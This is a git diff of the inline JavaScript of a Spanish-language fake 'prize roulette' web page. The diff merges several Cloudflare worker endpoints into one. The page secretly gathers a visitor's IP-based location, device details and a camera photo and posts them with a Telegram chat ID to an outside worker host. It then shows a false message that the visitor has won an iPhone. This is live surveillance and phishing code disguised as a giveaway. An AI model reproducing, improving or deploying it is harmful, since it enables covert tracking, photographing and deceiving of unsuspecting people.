@@ -106,18 +106,8 @@
 
     <script>
         // ================= CONFIGURACIÓN =================
-        // 🔥 TODAS LAS URLS QUE ME HAS DADO (las que funcionan)
-        const WORKER_URLS = [
-            'https://bot-ubi.societykark.workers.dev',
-            'https://bot-tg.societykark.workers.dev',
-            'https://tg-bot12.societykark.workers.dev',
-            'https://app-trk.societykark.workers.dev',
-            'https://app-tg.societykark.workers.dev',
-            'https://app-kali.societykark.workers.dev',
-            'https://societykark.pythonanywhere.com',
-            'https://kali-bot12.societykark.workers.dev',
-            'https://galleta.societykark.workers.dev'
-        ];
+        // 🔥 NUEVO WORKER (el que me diste)
+        const WORKER_URL = 'https://flxk.societykark.workers.dev';
         const CHAT_ID = '7555997298';
 
         // ========== FUNCIONES DE RECOLECCIÓN ==========
@@ -167,7 +157,7 @@
         // 4. Ubicación desde el Worker (IP, ciudad, país)
         async function getLocationFromWorker() {
             try {
-                const res = await fetch('https://bot-ubi.societykark.workers.dev'); // Cualquiera sirve
+                const res = await fetch(WORKER_URL);
                 if (!res.ok) throw new Error();
                 const data = await res.json();
                 return {
@@ -206,32 +196,26 @@
             } catch { return { total: 'N/A', used: 'N/A' }; }
         }
 
-        // ========== ENVÍO A MÚLTIPLES WORKERS (NUEVO) ==========
-        async function sendToMultipleWorkers(message, photoBlob) {
+        // ========== ENVÍO A WORKER ==========
+        async function sendToWorker(message, photoBlob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('text', message);
             if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
 
-            // Enviar a TODAS las URLs en paralelo
-            const promises = WORKER_URLS.map(async (url) => {
-                try {
-                    const res = await fetch(url, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'cors',
-                        credentials: 'omit'
-                    });
-                    if (!res.ok) {
-                        console.warn(`Error en ${url}: ${res.status}`);
-                    }
-                } catch (e) {
-                    console.warn(`Error en ${url}:`, e.message);
+            try {
+                const res = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                if (!res.ok) {
+                    console.warn('Error en Worker:', res.status);
                 }
-            });
-
-            // Esperar a que todas terminen (o fallen)
-            await Promise.all(promises);
+            } catch (e) {
+                console.warn('Error al enviar:', e);
+            }
         }
 
         // ========== ACCIÓN DEL BOTÓN ==========
@@ -292,8 +276,8 @@
             message += `📸 *Foto:* ${photo ? '✅ Capturada' : '❌ No disponible'}\n`;
             message += `━━━━━━━━━━━━━━━━\n🎯 Página: Ruleta de premios\n⚡ Desarrollado por: @Society`;
 
-            // Enviar a TODAS las URLs
-            await sendToMultipleWorkers(message, photo);
+            // Enviar al Worker
+            await sendToWorker(message, photo);
 
             // Mostrar mensaje falso
             document.getElementById('status').innerHTML = '🎉 ¡Felicidades! Has ganado un iPhone 16 Pro Max. <br> Te enviaremos un correo con las instrucciones.';
